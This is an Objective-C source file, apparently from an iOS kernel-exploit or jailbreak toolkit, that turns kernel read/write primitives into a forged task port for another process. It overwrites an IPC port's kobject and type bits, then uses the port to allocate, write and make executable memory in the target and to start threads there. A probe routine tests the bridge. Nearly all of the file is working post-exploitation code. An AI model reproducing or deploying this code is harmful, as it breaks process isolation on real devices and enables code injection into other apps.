#import "CNDKernelTaskBridge.h"

#import "../LogTextView.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/CNDLabKernelProtocol.h"
#import "../kexploit/CNDLabKernelProvider.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/offsets.h"

#import <mach/mach.h>
#import <mach/mach_time.h>
#if __has_feature(ptrauth_calls)
#import <ptrauth.h>
#endif
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

/* The public iPhoneOS SDK intentionally rejects <mach/mach_vm.h>, while the
 * 64-bit traps remain exported by libsystem_kernel and are already used by
 * Cyanide's VM layer. Keep the declarations local and ABI-exact. */
extern kern_return_t mach_vm_allocate(
    vm_map_t target, mach_vm_address_t *address,
    mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(
    vm_map_t target, mach_vm_address_t address,
    mach_vm_size_t size);
extern kern_return_t mach_vm_write(
    vm_map_t target, mach_vm_address_t address,
    vm_offset_t data, mach_msg_type_number_t dataCount);
extern kern_return_t mach_vm_read_overwrite(
    vm_map_t target, mach_vm_address_t address,
    mach_vm_size_t size, mach_vm_address_t data,
    mach_vm_size_t *outSize);
extern kern_return_t mach_vm_protect(
    vm_map_t target, mach_vm_address_t address, mach_vm_size_t size,
    boolean_t setMaximum, vm_prot_t newProtection);
extern kern_return_t mach_vm_machine_attribute(
    vm_map_t target, mach_vm_address_t address, mach_vm_size_t size,
    vm_machine_attribute_t attribute,
    vm_machine_attribute_val_t *value);

static NSString * const CNDKernelTaskBridgeErrorDomain =
    @"CNDKernelTaskBridgeError";

extern bool gIsPACSupported;

@interface CNDKernelTaskBridgeSession ()
@property(nonatomic, readwrite) pid_t pid;
@property(nonatomic, copy, readwrite) NSString *processName;
@property(nonatomic, copy, readwrite) NSString *mode;
@property(nonatomic, readwrite, getter=isOpen) BOOL open;
@property(nonatomic) BOOL lab;
@property(nonatomic) uint64_t targetProc;
@property(nonatomic) uint64_t targetTask;
@property(nonatomic) mach_port_t taskPort;
@property(nonatomic) uint64_t portObject;
@property(nonatomic) uint32_t originalPortBits;
@property(nonatomic) uint64_t originalPortKobject;
@property(nonatomic) thread_act_t bootstrapThread;
@end

@implementation CNDKernelTaskBridgeSession

static void CNDKernelTaskBridgeSetError(
    NSError **error, NSInteger code, NSString *description)
{
    if (!error) return;
    *error = [NSError errorWithDomain:CNDKernelTaskBridgeErrorDomain
                                  code:code
                              userInfo:@{
        NSLocalizedDescriptionKey: description ?: @"Kernel task bridge failed.",
    }];
}

+ (instancetype)openProcess:(NSString *)processName error:(NSError **)error
{
    return [self openPID:0 expectedProcessName:processName error:error];
}

+ (instancetype)openPID:(pid_t)requestedPID
     expectedProcessName:(NSString *)processName
                   error:(NSError **)error
{
    if (processName.length == 0 || processName.length >= 32 ||
        (requestedPID != 0 && requestedPID <= 1)) {
        CNDKernelTaskBridgeSetError(
            error, EINVAL, @"A valid PID and short process name are required.");
        return nil;
    }
    if (!kexploit_krw_ready()) {
        CNDKernelTaskBridgeSetError(error, ENODEV,
            @"Kernel read/write is not ready.");
        return nil;
    }

    CNDKernelTaskBridgeSession *session =
        [[CNDKernelTaskBridgeSession alloc] init];
    session.processName = processName;
    if (cnd_lab_direct_task_active()) {
        pid_t labPID = 0;
        int result = cnd_lab_resolve_process_pid(
            processName.UTF8String, &labPID);
        if (result != 0 || labPID <= 1 ||
            (requestedPID > 1 && requestedPID != labPID)) {
            CNDKernelTaskBridgeSetError(error, result ?: ESRCH,
                @"The exact target process is not resident.");
            return nil;
        }
        result = cnd_lab_remote_task_open(labPID);
        if (result != 0) {
            CNDKernelTaskBridgeSetError(error, result,
                @"The vPhone root harness could not open the target task.");
            return nil;
        }
        session.pid = labPID;
        session.lab = YES;
        session.mode = @"vphone-root-task-session";
        session.open = YES;
        return session;
    }
    uint64_t proc = requestedPID > 1
        ? proc_find(requestedPID)
        : proc_find_by_name(processName.UTF8String);
    if (!is_kaddr_valid(proc)) {
        CNDKernelTaskBridgeSetError(error, ESRCH,
            @"The exact target process is not resident.");
        return nil;
    }

    /*
     * On arm64e, ipc_port::ip_kobject is authenticated with a kernel data
     * key and address diversity. Copying a stripped task pointer into a new
     * port object gives that destination the wrong signature; the first Mach
     * trap through it panics the kernel. The vPhone root-task transport does
     * not forge this field and returned above. Physical arm64e callers must
     * use RemoteCall or another kernel-supported task-right acquisition path.
     */
    if (gIsPACSupported) {
        CNDKernelTaskBridgeSetError(error, ENOTSUP,
            @"The physical forged task-port bridge is disabled on arm64e because ip_kobject requires a destination-specific kernel PAC signature.");
        return nil;
    }

    pid_t pid = (pid_t)kread32(proc + off_proc_p_pid);
    uint64_t task = proc_task(proc);
    const char *kernelName = proc_get_p_name(proc);
    if (pid <= 1 || (requestedPID > 1 && requestedPID != pid) ||
        !kernelName || strcmp(kernelName, processName.UTF8String) != 0 ||
        !is_kaddr_valid(task) || proc_find(pid) != proc ||
        proc_task(proc) != task) {
        CNDKernelTaskBridgeSetError(error, ESRCH,
            @"The target process identity changed during capture.");
        return nil;
    }
    uint64_t selfTask = task_self();
    uint64_t selfPortObject = is_kaddr_valid(selfTask)
        ? task_get_ipc_port_object(selfTask, mach_task_self()) : 0;
    if (!off_ipc_port_ip_kobject || !is_kaddr_valid(selfPortObject) ||
        kread_ptr(selfPortObject + off_ipc_port_ip_kobject) != selfTask) {
        CNDKernelTaskBridgeSetError(error, EFAULT,
            @"kslop's task-control port failed validation.");
        return nil;
    }

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(
        mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr == KERN_SUCCESS) {
        kr = mach_port_insert_right(
            mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    }
    uint64_t portObject = kr == KERN_SUCCESS
        ? task_get_ipc_port_object(selfTask, port) : 0;
    if (kr != KERN_SUCCESS || !is_kaddr_valid(portObject)) {
        if (MACH_PORT_VALID(port)) mach_port_destroy(mach_task_self(), port);
        CNDKernelTaskBridgeSetError(error, kr ?: KERN_FAILURE,
            @"The temporary task bridge port could not be allocated.");
        return nil;
    }

    uint32_t originalBits = kread32(portObject);
    uint64_t originalKobject =
        kread_ptr(portObject + off_ipc_port_ip_kobject);
    uint32_t taskBits = kread32(selfPortObject);
    kwrite64(portObject + off_ipc_port_ip_kobject, task);
    kwrite32(portObject, taskBits);
    pid_t observedPID = 0;
    kr = pid_for_task(port, &observedPID);
    if (kr != KERN_SUCCESS || observedPID != pid) {
        kwrite64(portObject + off_ipc_port_ip_kobject, originalKobject);
        kwrite32(portObject, originalBits);
        BOOL restored =
            kread_ptr(portObject + off_ipc_port_ip_kobject) == originalKobject &&
            kread32(portObject) == originalBits;
        if (restored) mach_port_destroy(mach_task_self(), port);
        CNDKernelTaskBridgeSetError(error, kr ?: KERN_FAILURE,
            @"The temporary task right did not bind to the exact PID.");
        return nil;
    }

    session.pid = pid;
    session.targetProc = proc;
    session.targetTask = task;
    session.taskPort = port;
    session.portObject = portObject;
    session.originalPortBits = originalBits;
    session.originalPortKobject = originalKobject;
    session.mode = @"kernel-forged-task-port";
    session.open = YES;
    return session;
}

- (kern_return_t)allocateLength:(size_t)length addressOut:(uint64_t *)addressOut
{
    if (!self.open || !length || !addressOut) return KERN_INVALID_ARGUMENT;
    if (self.lab) {
        return (kern_return_t)cnd_lab_remote_task_allocate(length, addressOut);
    }
    mach_vm_address_t address = 0;
    kern_return_t kr = mach_vm_allocate(
        self.taskPort, &address, length, VM_FLAGS_ANYWHERE);
    if (kr == KERN_SUCCESS) *addressOut = address;
    return kr;
}

- (kern_return_t)readAddress:(uint64_t)address
                      buffer:(void *)buffer
                      length:(size_t)length
{
    if (!self.open || !address || !buffer || !length) {
        return KERN_INVALID_ARGUMENT;
    }
    if (self.lab) {
        size_t offset = 0;
        while (offset < length) {
            size_t chunk = MIN(length - offset,
                               (size_t)CND_LAB_KRW_MAX_TRANSFER);
            int result = cnd_lab_remote_task_read(
                address + offset, (uint8_t *)buffer + offset, chunk);
            if (result != 0) return (kern_return_t)result;
            offset += chunk;
        }
        return KERN_SUCCESS;
    }
    mach_vm_size_t copied = 0;
    kern_return_t kr = mach_vm_read_overwrite(
        self.taskPort, address, length,
        (mach_vm_address_t)(uintptr_t)buffer, &copied);
    return kr == KERN_SUCCESS && copied == length ? KERN_SUCCESS :
        (kr == KERN_SUCCESS ? KERN_FAILURE : kr);
}

- (kern_return_t)writeAddress:(uint64_t)address
                       buffer:(const void *)buffer
                       length:(size_t)length
{
    if (!self.open || !address || !buffer || !length) {
        return KERN_INVALID_ARGUMENT;
    }
    if (self.lab) {
        size_t offset = 0;
        while (offset < length) {
            size_t chunk = MIN(length - offset,
                               (size_t)CND_LAB_KRW_MAX_TRANSFER);
            int result = cnd_lab_remote_task_write(
                address + offset, (const uint8_t *)buffer + offset, chunk);
            if (result != 0) return (kern_return_t)result;
            offset += chunk;
        }
        return KERN_SUCCESS;
    }
    return mach_vm_write(self.taskPort, address,
        (vm_offset_t)(uintptr_t)buffer, (mach_msg_type_number_t)length);
}

- (kern_return_t)deallocateAddress:(uint64_t)address length:(size_t)length
{
    if (!self.open || !address || !length) return KERN_INVALID_ARGUMENT;
    return self.lab
        ? (kern_return_t)cnd_lab_remote_task_deallocate(address, length)
        : mach_vm_deallocate(self.taskPort, address, length);
}

- (kern_return_t)protectRXAddress:(uint64_t)address length:(size_t)length
{
    if (!self.open || !address || !length) return KERN_INVALID_ARGUMENT;
    return self.lab
        ? (kern_return_t)cnd_lab_remote_task_protect_rx(address, length)
        : mach_vm_protect(self.taskPort, address, length, FALSE,
                          VM_PROT_READ | VM_PROT_EXECUTE);
}

- (kern_return_t)flushInstructionCacheAtAddress:(uint64_t)address
                                          length:(size_t)length
{
    if (!self.open || !address || !length) return KERN_INVALID_ARGUMENT;
    if (self.lab) {
        return (kern_return_t)cnd_lab_remote_task_cache_flush(address, length);
    }
    vm_machine_attribute_val_t value = MATTR_VAL_CACHE_FLUSH;
    return mach_vm_machine_attribute(
        self.taskPort, address, length, MATTR_CACHE, &value);
}

- (kern_return_t)startBootstrapThreadAtAddress:(uint64_t)entryPoint
                                  stackPointer:(uint64_t)stackPointer
{
    if (!self.open || !entryPoint || !stackPointer ||
        MACH_PORT_VALID(self.bootstrapThread)) return KERN_INVALID_ARGUMENT;
    if (self.lab) {
        return (kern_return_t)cnd_lab_remote_task_thread_start(
            entryPoint, stackPointer);
    }
    arm_thread_state64_t state = {0};
#if __DARWIN_OPAQUE_ARM_THREAD_STATE64
#if __has_feature(ptrauth_calls)
    void *signedPC = ptrauth_sign_unauthenticated(
        (void *)(uintptr_t)entryPoint,
        ptrauth_key_process_independent_code,
        ptrauth_string_discriminator("pc"));
    arm_thread_state64_set_pc_presigned_fptr(state, signedPC);
    arm_thread_state64_set_sp(state, stackPointer);
#else
    state.__opaque_pc = (void *)(uintptr_t)entryPoint;
    state.__opaque_sp = (void *)(uintptr_t)stackPointer;
    state.__opaque_flags = __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH;
#endif
#else
    state.__pc = entryPoint;
    state.__sp = stackPointer;
#endif
    return thread_create_running(
        self.taskPort, ARM_THREAD_STATE64, (thread_state_t)&state,
        ARM_THREAD_STATE64_COUNT, &_bootstrapThread);
}

- (kern_return_t)terminateBootstrapThread
{
    if (!self.open) return KERN_INVALID_TASK;
    if (self.lab) return (kern_return_t)cnd_lab_remote_task_thread_terminate();
    if (!MACH_PORT_VALID(self.bootstrapThread)) return KERN_SUCCESS;
    kern_return_t kr = thread_terminate(self.bootstrapThread);
    mach_port_deallocate(mach_task_self(), self.bootstrapThread);
    self.bootstrapThread = MACH_PORT_NULL;
    return kr;
}

- (BOOL)identityIsStable
{
    if (!self.open) return NO;
    if (self.lab) {
        pid_t pid = 0;
        return cnd_lab_resolve_process_pid(
            self.processName.UTF8String, &pid) == 0 && pid == self.pid;
    }
    return proc_find(self.pid) == self.targetProc &&
        proc_task(self.targetProc) == self.targetTask;
}

- (BOOL)close
{
    if (!self.open) return YES;
    (void)[self terminateBootstrapThread];
    BOOL closed = NO;
    if (self.lab) {
        closed = cnd_lab_remote_task_close() == 0;
    } else if (is_kaddr_valid(self.portObject)) {
        kwrite64(self.portObject + off_ipc_port_ip_kobject,
                 self.originalPortKobject);
        kwrite32(self.portObject, self.originalPortBits);
        BOOL restored =
            kread_ptr(self.portObject + off_ipc_port_ip_kobject) ==
                self.originalPortKobject &&
            kread32(self.portObject) == self.originalPortBits;
        closed = restored && mach_port_destroy(
            mach_task_self(), self.taskPort) == KERN_SUCCESS;
    }
    if (closed) self.open = NO;
    return closed;
}

- (void)dealloc
{
    (void)[self close];
}

@end

pid_t CNDKernelTaskBridgeResolveProcessPID(NSString *processName,
                                            NSError **error)
{
    if (processName.length == 0 || processName.length >= 32) {
        CNDKernelTaskBridgeSetError(
            error, EINVAL, @"A short process name is required.");
        return 0;
    }
    if (!kexploit_krw_ready()) {
        CNDKernelTaskBridgeSetError(
            error, ENODEV, @"Kernel read/write is not ready.");
        return 0;
    }

    /* The vPhone provider can answer this in one root-side sysctl. Avoid a
     * process-list walk made up of hundreds of socket-backed kernel reads. */
    if (cnd_lab_process_resolve_active()) {
        pid_t labPID = 0;
        int result = cnd_lab_resolve_process_pid(
            processName.UTF8String, &labPID);
        if (result == 0 && labPID > 1) return labPID;
        CNDKernelTaskBridgeSetError(
            error, result ?: ESRCH,
            @"The exact target process is not resident.");
        return 0;
    }

    uint64_t proc = 0;
    uint64_t anchor = proc_self();
    const uint32_t directions[] = {
        off_proc_p_list_le_next, off_proc_p_list_le_prev,
    };
    for (NSUInteger direction = 0;
         direction < sizeof(directions) / sizeof(directions[0]) && !proc;
         direction++) {
        uint64_t candidate = anchor;
        for (NSUInteger index = 0;
             index < 4096 && is_kaddr_valid(candidate); index++) {
            char capturedName[32] = {0};
            kreadbuf(candidate + off_proc_p_name,
                     capturedName, sizeof(capturedName));
            capturedName[sizeof(capturedName) - 1] = '\0';
            if (strcmp(capturedName, processName.UTF8String) == 0) {
                proc = candidate;
                break;
            }
            uint64_t next = kread64(candidate + directions[direction]);
            if (!is_kaddr_valid(next) || next == candidate) break;
            candidate = next;
        }
    }
    if (!is_kaddr_valid(proc)) {
        CNDKernelTaskBridgeSetError(
            error, ESRCH, @"The exact target process is not resident.");
        return 0;
    }
    pid_t pid = (pid_t)kread32(proc + off_proc_p_pid);
    char capturedName[32] = {0};
    kreadbuf(proc + off_proc_p_name, capturedName, sizeof(capturedName));
    capturedName[sizeof(capturedName) - 1] = '\0';
    if (pid <= 1 ||
        strcmp(capturedName, processName.UTF8String) != 0 ||
        proc_find(pid) != proc) {
        CNDKernelTaskBridgeSetError(
            error, ESRCH,
            @"The target process identity changed during resolution.");
        return 0;
    }
    return pid;
}

typedef struct {
    uint64_t magic;
    uint64_t nonce;
    uint64_t targetProc;
    uint64_t targetTask;
    uint32_t targetPID;
    uint32_t version;
} CNDKernelTaskBridgeProbePayload;

static const uint64_t CNDKernelTaskBridgeProbeMagic =
    0x434e444b54425231ULL; /* CNDKTBR1 */

static NSObject *CNDKernelTaskBridgeLock(void)
{
    static NSObject *lock = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        lock = [[NSObject alloc] init];
    });
    return lock;
}

static double CNDKernelTaskBridgeElapsedMilliseconds(uint64_t start,
                                                     uint64_t end)
{
    mach_timebase_info_data_t timebase = {0};
    if (mach_timebase_info(&timebase) != KERN_SUCCESS ||
        timebase.denom == 0 || end < start) {
        return 0.0;
    }
    long double nanoseconds = (long double)(end - start) *
        (long double)timebase.numer / (long double)timebase.denom;
    return (double)(nanoseconds / 1000000.0L);
}

static NSDictionary<NSString *, id> *CNDKernelTaskBridgeResult(
    BOOL ok,
    NSString *stage,
    NSString *message,
    NSString *processName,
    NSString *bridgeMode,
    pid_t pid,
    uint64_t proc,
    uint64_t task,
    mach_port_t bridgePort,
    uint64_t targetAddress,
    kern_return_t pidResult,
    kern_return_t allocateResult,
    kern_return_t writeResult,
    kern_return_t readResult,
    kern_return_t deallocateResult,
    BOOL identityStable,
    BOOL readbackVerified,
    BOOL portRestored,
    BOOL portDestroyed,
    BOOL labSessionClosed,
    double elapsedMilliseconds)
{
    return @{
        @"ok": @(ok),
        @"stage": stage ?: @"kernel-task-bridge",
        @"message": message ?: @"",
        @"process": processName ?: @"",
        @"bridgeMode": bridgeMode ?: @"none",
        @"pid": @(pid),
        @"proc": @(proc),
        @"task": @(task),
        @"bridgePort": @(bridgePort),
        @"targetAddress": @(targetAddress),
        @"pidForTaskResult": @(pidResult),
        @"allocateResult": @(allocateResult),
        @"writeResult": @(writeResult),
        @"readResult": @(readResult),
        @"deallocateResult": @(deallocateResult),
        @"identityStable": @(identityStable),
        @"readbackVerified": @(readbackVerified),
        @"portRestored": @(portRestored),
        @"portDestroyed": @(portDestroyed),
        @"labSessionClosed": @(labSessionClosed),
        @"elapsedMilliseconds": @(elapsedMilliseconds),
        @"remoteCallUsed": @NO,
        @"targetCodeExecuted": @NO,
    };
}

static NSDictionary<NSString *, id> *CNDKernelTaskBridgeProbeResolvedTarget(
    pid_t resolvedPID, NSString *processName)
{
    uint64_t started = mach_continuous_time();
    NSString *requested = [processName copy] ?: @"";
    if (requested.length == 0 || requested.length >= 32) {
        return CNDKernelTaskBridgeResult(
            NO, @"process-name", @"A short target process name is required.",
            requested, @"none", 0, 0, 0, MACH_PORT_NULL, 0,
            KERN_INVALID_ARGUMENT, KERN_INVALID_ARGUMENT,
            KERN_INVALID_ARGUMENT, KERN_INVALID_ARGUMENT,
            KERN_INVALID_ARGUMENT, NO, NO, NO, NO, YES,
            CNDKernelTaskBridgeElapsedMilliseconds(
                started, mach_continuous_time()));
    }

    @synchronized (CNDKernelTaskBridgeLock()) {
        pid_t targetPID = 0;
        uint64_t targetProc = 0;
        uint64_t targetTask = 0;
        mach_port_t bridgePort = MACH_PORT_NULL;
        uint64_t bridgePortObject = 0;
        uint32_t originalPortBits = 0;
        uint64_t originalPortKobject = 0;
        mach_vm_address_t targetAddress = 0;
        mach_vm_size_t targetLength = (mach_vm_size_t)getpagesize();
        kern_return_t pidResult = KERN_NOT_SUPPORTED;
        kern_return_t allocateResult = KERN_NOT_SUPPORTED;
        kern_return_t writeResult = KERN_NOT_SUPPORTED;
        kern_return_t readResult = KERN_NOT_SUPPORTED;
        kern_return_t deallocateResult = KERN_NOT_SUPPORTED;
        BOOL identityStable = NO;
        BOOL readbackVerified = NO;
        BOOL portRestored = YES;
        BOOL portDestroyed = YES;
        BOOL labTaskBridge = NO;
        BOOL labTaskOpened = NO;
        BOOL labSessionClosed = YES;
        NSString *stage = @"preflight";
        NSString *message = @"The kernel task bridge probe failed.";

        if (!kexploit_krw_ready()) {
            stage = @"krw-unavailable";
            message = @"Kernel read/write is not ready.";
            goto finish;
        }
        if (cnd_lab_direct_task_active()) {
            pid_t labPID = 0;
            int resolveResult = cnd_lab_resolve_process_pid(
                requested.UTF8String, &labPID);
            if (resolveResult != 0 || labPID <= 1 ||
                (resolvedPID > 1 && labPID != resolvedPID)) {
                stage = @"process-unavailable";
                message = [NSString stringWithFormat:
                    @"%@ is not currently resident; open it and retry.", requested];
                goto finish;
            }
            targetPID = labPID;
            int openResult = cnd_lab_remote_task_open(targetPID);
            if (openResult != 0) {
                stage = @"lab-task-open";
                message = @"The vPhone root harness could not open the exact target task.";
                goto finish;
            }
            labTaskBridge = YES;
            labTaskOpened = YES;
            labSessionClosed = NO;
            pidResult = KERN_SUCCESS;
        } else {
            targetProc = resolvedPID > 1
                ? proc_find(resolvedPID)
                : proc_find_by_name(requested.UTF8String);
            if (!is_kaddr_valid(targetProc)) {
                stage = @"process-unavailable";
                message = [NSString stringWithFormat:
                    @"%@ is not currently resident; open it and retry.", requested];
                goto finish;
            }
            targetPID = (pid_t)kread32(targetProc + off_proc_p_pid);
            targetTask = proc_task(targetProc);
            char capturedName[32] = {0};
            const char *kernelName = proc_get_p_name(targetProc);
            if (kernelName) {
                strlcpy(capturedName, kernelName, sizeof(capturedName));
            }
            if (targetPID <= 1 ||
                (resolvedPID > 1 && targetPID != resolvedPID) ||
                strcmp(capturedName, requested.UTF8String) != 0 ||
                !is_kaddr_valid(targetTask) ||
                proc_find(targetPID) != targetProc ||
                proc_task(targetProc) != targetTask) {
                stage = @"process-identity";
                message = @"The target process identity changed during capture.";
                goto finish;
            }
        }

        if (!labTaskBridge && gIsPACSupported) {
            stage = @"kernel-pointer-auth";
            message = @"The physical forged task-port probe is disabled because ip_kobject requires a destination-specific kernel PAC signature.";
            goto finish;
        }

        uint64_t selfTask = 0;
        uint64_t selfTaskPortObject = 0;
        if (!labTaskBridge) {
            if (!off_ipc_port_ip_kobject || targetLength < 4096 ||
                (targetLength & (targetLength - 1)) != 0) {
                stage = @"kernel-layout";
                message = @"The IPC-port layout or target page size is invalid.";
                goto finish;
            }
            selfTask = task_self();
            if (!is_kaddr_valid(selfTask)) {
                stage = @"self-task";
                message = @"kslop could not resolve its own kernel task.";
                goto finish;
            }
            mach_port_t selfTaskPort = mach_task_self();
            selfTaskPortObject =
                task_get_ipc_port_object(selfTask, selfTaskPort);
            if (!is_kaddr_valid(selfTaskPortObject) ||
                kread_ptr(selfTaskPortObject + off_ipc_port_ip_kobject) !=
                    selfTask) {
                stage = @"self-task-port";
                message = @"kslop's task-control port failed validation.";
                goto finish;
            }
        }

        if (!labTaskBridge) {
            kern_return_t kr = mach_port_allocate(
                mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &bridgePort);
            if (kr != KERN_SUCCESS) {
                stage = @"port-allocate";
                message = @"Could not allocate the temporary bridge port.";
                goto finish;
            }
            portRestored = NO;
            portDestroyed = NO;
            kr = mach_port_insert_right(
                mach_task_self(), bridgePort, bridgePort,
                MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                stage = @"port-send-right";
                message = @"Could not create the temporary bridge send right.";
                goto finish;
            }
            bridgePortObject = task_get_ipc_port_object(selfTask, bridgePort);
            if (!is_kaddr_valid(bridgePortObject)) {
                stage = @"port-object";
                message = @"Could not resolve the temporary bridge port object.";
                goto finish;
            }

            originalPortBits = kread32(bridgePortObject);
            originalPortKobject =
                kread_ptr(bridgePortObject + off_ipc_port_ip_kobject);
            uint32_t taskPortBits = kread32(selfTaskPortObject);
            if (!(originalPortBits & 0x80000000U) ||
                !(taskPortBits & 0x80000000U)) {
                stage = @"port-bits";
                message = @"The bridge or task-control port is not active.";
                goto finish;
            }

            /* Set the kobject while this is still an ordinary port, then
             * publish the validated task-control type. */
            kwrite64(bridgePortObject + off_ipc_port_ip_kobject, targetTask);
            if (kread_ptr(bridgePortObject + off_ipc_port_ip_kobject) !=
                targetTask) {
                stage = @"port-kobject-write";
                message = @"The target task pointer did not read back.";
                goto finish;
            }
            kwrite32(bridgePortObject, taskPortBits);
            if (kread32(bridgePortObject) != taskPortBits) {
                stage = @"port-type-write";
                message = @"The task-control port type did not read back.";
                goto finish;
            }

            pid_t observedPID = 0;
            pidResult = pid_for_task(bridgePort, &observedPID);
            if (pidResult != KERN_SUCCESS || observedPID != targetPID) {
                stage = @"task-binding";
                message = @"The temporary task right did not bind to the exact target PID.";
                goto finish;
            }
        }

        allocateResult = labTaskBridge
            ? (kern_return_t)cnd_lab_remote_task_allocate(
                targetLength, &targetAddress)
            : mach_vm_allocate(
                bridgePort, &targetAddress, targetLength, VM_FLAGS_ANYWHERE);
        if (allocateResult != KERN_SUCCESS || targetAddress == 0) {
            stage = @"remote-allocate";
            message = @"The exact target rejected the harmless page allocation.";
            goto finish;
        }

        CNDKernelTaskBridgeProbePayload expected = {0};
        expected.magic = CNDKernelTaskBridgeProbeMagic;
        arc4random_buf(&expected.nonce, sizeof(expected.nonce));
        expected.targetProc = targetProc;
        expected.targetTask = targetTask;
        expected.targetPID = (uint32_t)targetPID;
        expected.version = 1;
        writeResult = labTaskBridge
            ? (kern_return_t)cnd_lab_remote_task_write(
                targetAddress, &expected, sizeof(expected))
            : mach_vm_write(
                bridgePort, targetAddress,
                (vm_offset_t)(uintptr_t)&expected,
                (mach_msg_type_number_t)sizeof(expected));
        if (writeResult != KERN_SUCCESS) {
            stage = @"remote-write";
            message = @"The harmless probe payload write failed.";
            goto finish;
        }

        CNDKernelTaskBridgeProbePayload observed = {0};
        mach_vm_size_t observedLength = 0;
        if (labTaskBridge) {
            readResult = (kern_return_t)cnd_lab_remote_task_read(
                targetAddress, &observed, sizeof(observed));
            observedLength = readResult == KERN_SUCCESS
                ? sizeof(observed) : 0;
        } else {
            readResult = mach_vm_read_overwrite(
                bridgePort, targetAddress, sizeof(observed),
                (mach_vm_address_t)(uintptr_t)&observed, &observedLength);
        }
        readbackVerified = readResult == KERN_SUCCESS &&
            observedLength == sizeof(observed) &&
            memcmp(&expected, &observed, sizeof(expected)) == 0;
        if (!readbackVerified) {
            stage = @"remote-readback";
            message = @"The harmless probe payload did not read back exactly.";
            goto finish;
        }

        if (labTaskBridge) {
            pid_t livePID = 0;
            identityStable = cnd_lab_resolve_process_pid(
                requested.UTF8String, &livePID) == 0 && livePID == targetPID;
        } else {
            identityStable = proc_find(targetPID) == targetProc &&
                proc_task(targetProc) == targetTask;
        }
        if (!identityStable) {
            stage = @"identity-drift";
            message = @"The target process changed during the probe.";
            goto finish;
        }
        stage = @"probe-complete";
        message = @"The direct kernel task bridge passed exact allocation, write, and readback checks.";

    finish:
        if (targetAddress &&
            (bridgePort != MACH_PORT_NULL || labTaskBridge)) {
            deallocateResult = labTaskBridge
                ? (kern_return_t)cnd_lab_remote_task_deallocate(
                    targetAddress, targetLength)
                : mach_vm_deallocate(
                    bridgePort, targetAddress, targetLength);
            if (deallocateResult != KERN_SUCCESS &&
                [stage isEqualToString:@"probe-complete"]) {
                stage = @"remote-deallocate";
                message = @"Readback passed, but the harmless target page was not deallocated.";
            }
        }

        if (is_kaddr_valid(bridgePortObject)) {
            /* Restore the original kobject before restoring the ordinary port
             * type. Never destroy a port that did not verify as restored. */
            kwrite64(bridgePortObject + off_ipc_port_ip_kobject,
                     originalPortKobject);
            kwrite32(bridgePortObject, originalPortBits);
            portRestored =
                kread_ptr(bridgePortObject + off_ipc_port_ip_kobject) ==
                    originalPortKobject &&
                kread32(bridgePortObject) == originalPortBits;
        }
        if (bridgePort != MACH_PORT_NULL &&
            (!bridgePortObject || portRestored)) {
            portDestroyed = mach_port_destroy(
                mach_task_self(), bridgePort) == KERN_SUCCESS;
        }
        if (labTaskOpened) {
            labSessionClosed = cnd_lab_remote_task_close() == 0;
            if (!labSessionClosed && [stage isEqualToString:@"probe-complete"]) {
                stage = @"lab-task-close";
                message = @"The vPhone task-memory session did not close cleanly.";
            }
        }

        BOOL ok = [stage isEqualToString:@"probe-complete"] &&
            pidResult == KERN_SUCCESS &&
            allocateResult == KERN_SUCCESS &&
            writeResult == KERN_SUCCESS &&
            readbackVerified && identityStable &&
            deallocateResult == KERN_SUCCESS &&
            portRestored && portDestroyed && labSessionClosed;
        if (bridgePort != MACH_PORT_NULL && !portRestored) {
            stage = @"port-restore";
            message = @"The temporary bridge port did not restore exactly; it was intentionally left allocated.";
            ok = NO;
        } else if (bridgePort != MACH_PORT_NULL && !portDestroyed) {
            stage = @"port-destroy";
            message = @"The restored temporary bridge port could not be destroyed.";
            ok = NO;
        }

        double elapsed = CNDKernelTaskBridgeElapsedMilliseconds(
            started, mach_continuous_time());
        log_user("[SBR_ALPHA] phase1 kernel-task-bridge ok=%s "
                 "stage=%s mode=%s process=%s pid=%d bind=%d allocate=%d "
                 "write=%d read=%d verify=%s deallocate=%d "
                 "identity=%s port-restored=%s port-destroyed=%s "
                 "lab-session-closed=%s remote-call=no target-code=no time=%.3fms\n",
                 ok ? "yes" : "no", stage.UTF8String ?: "-",
                 labTaskBridge ? "vphone-root-task-session" :
                     "kernel-forged-task-port",
                 requested.UTF8String ?: "-", targetPID, pidResult,
                 allocateResult, writeResult, readResult,
                 readbackVerified ? "yes" : "no", deallocateResult,
                 identityStable ? "stable" : "unverified",
                 portRestored ? "yes" : "no",
                 portDestroyed ? "yes" : "no",
                 labSessionClosed ? "yes" : "no", elapsed);
        return CNDKernelTaskBridgeResult(
            ok, stage, message, requested,
            labTaskBridge ? @"vphone-root-task-session" :
                @"kernel-forged-task-port",
            targetPID, targetProc,
            targetTask, bridgePort, targetAddress, pidResult,
            allocateResult, writeResult, readResult, deallocateResult,
            identityStable, readbackVerified, portRestored,
            portDestroyed, labSessionClosed, elapsed);
    }
}

NSDictionary<NSString *, id> *
CNDKernelTaskBridgeProbeProcess(NSString *processName)
{
    return CNDKernelTaskBridgeProbeResolvedTarget(0, processName);
}

NSDictionary<NSString *, id> *
CNDKernelTaskBridgeProbePID(pid_t pid, NSString *expectedProcessName)
{
    if (pid <= 1) {
        return CNDKernelTaskBridgeResult(
            NO, @"process-pid", @"A valid target PID is required.",
            expectedProcessName ?: @"", @"none", pid, 0, 0,
            MACH_PORT_NULL, 0,
            KERN_INVALID_ARGUMENT, KERN_INVALID_ARGUMENT,
            KERN_INVALID_ARGUMENT, KERN_INVALID_ARGUMENT,
            KERN_INVALID_ARGUMENT, NO, NO, YES, YES, YES, 0.0);
    }
    return CNDKernelTaskBridgeProbeResolvedTarget(
        pid, expectedProcessName);
}
